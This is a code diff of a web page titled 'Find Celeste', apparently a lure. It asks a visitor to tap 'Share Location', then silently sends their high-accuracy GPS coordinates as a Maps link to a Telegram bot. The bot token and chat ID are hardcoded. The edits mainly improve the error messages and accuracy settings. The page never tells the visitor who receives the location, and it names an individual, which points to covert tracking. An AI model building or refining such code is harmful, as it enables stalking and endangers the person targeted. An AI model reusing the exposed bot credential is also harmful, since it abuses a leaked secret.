@@ -1,48 +1,52 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Find Celeste</title>
-</head>
-<body style="font-family:sans-serif;text-align:center;margin-top:60px;">
-  <h2>Tap to share your location</h2>
-  <button onclick="sendLocation()" style="padding:15px 25px;font-size:16px;">
-    Share Location
-  </button>
-  <p id="status"></p>
+<script>
+function sendLocation() {
+  const status = document.getElementById("status");
 
-  <script>
-    function sendLocation() {
-      const status = document.getElementById("status");
+  if (!navigator.geolocation) {
+    status.innerText = "Location not supported on this device";
+    return;
+  }
 
-      if (!navigator.geolocation) {
-        status.innerText = "Geolocation not supported";
-        return;
-      }
+  status.innerText = "Getting location...";
 
-      status.innerText = "Getting location...";
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
 
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-        // 🔥 SEND TO TELEGRAM
-        await fetch(`https://api.telegram.org/botY8953001767:AAFK9ee7ZlDhAnpyris-I3HgHOxiKJVH_wc/sendMessage`, {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({
-            chat_id: "7108523088",
-            text: `📍 New Location:\n${mapsLink}`
-          })
-        });
-
-        status.innerText = "Sent. You can close this.";
-      },
-      () => {
-        status.innerText = "Permission denied";
+      await fetch(`https://api.telegram.org/bot8953001767:AAFK9ee7ZlDhAnpyris-I3HgHOxiKJVH_wc/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          chat_id: "7108523088",
+          text: `📍 Location:\n${mapsLink}`
+        })
       });
+
+      status.innerText = "Sent successfully";
+    },
+    (error) => {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          status.innerText = "You need to allow location access";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          status.innerText = "Location unavailable (turn on GPS)";
+          break;
+        case error.TIMEOUT:
+          status.innerText = "Location request timed out, try again";
+          break;
+        default:
+          status.innerText = "Failed to get location";
+      }
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
     }
-  </script>
-</body>
-</html>
+  );
+}
+</script>
